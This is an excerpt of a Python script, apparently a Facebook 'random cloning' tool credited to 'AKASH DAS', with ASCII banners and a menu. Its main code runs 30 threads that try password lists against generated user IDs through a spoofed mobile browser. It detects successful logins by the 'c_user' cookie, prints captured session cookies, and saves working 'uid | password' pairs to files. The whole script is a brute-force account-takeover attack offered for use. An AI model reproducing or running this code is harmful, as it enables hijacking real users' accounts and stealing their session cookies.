...
$$    $$/ $$    $$/ $$ |  $$ |
 $$$$$$/   $$$$$$/  $$/   $$/     V.1
\033[1;30m───────────────────────────────────────────
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : AKASH DAS             
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : AKASH DAS            
...
$$    $$/ $$    $$/ $$ |  $$ |
 $$$$$$/   $$$$$$/  $$/   $$/   V.1
\033[1;30m───────────────────────────────────────────
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    :    𝘾𝙃𝘼𝙋𝙏𝙀𝙍 𝘾𝙇𝙊𝙎𝙀
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  :  𝘾𝙃𝘼𝙋𝙏𝙀𝙍 𝘾𝙇𝙊𝙎𝙀
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mTOOL      : RANDOM CLONE            
\033[1;30m───────────────────────────────────────────""")
...
def Main():
        os.system("clear")
        os.system('xdg-open ')
        os.system('espeak -a 300 "WELCOME TO CCA RANDOM TOOLS"')
        print(logo)
        print(" \x1b[0m[1] RANDOM CLONING \x1b[1;95m (BANGLADESH)")
        print(" \x1b[1;94m[0] Exit")
        Akashsexy =input("\n \x1b[1;96m[?] Choose : ")
        if Akashsexy in ["1","01"]:
            fuck()
        if Akashsexy in [" 0", "00"]:
            exit()
        else:
            exit()
...
def fuck():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for love in user:
            ...
            yaari.submit(Akashsexy2,uid,pwx,tl)
    print('•────────────────•°•❀•°•────────────────•')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in Akash/OK.txt')
    print(' [+] CP Ids saved in Akash/CP.txt')
    print('•────────────────•°•❀•°•────────────────•')
def Akashsexy2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[Akash]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[CCA-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[Akash-CP☠️] {uid}|{ps}")
                open('/sdcard/Akash-OK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
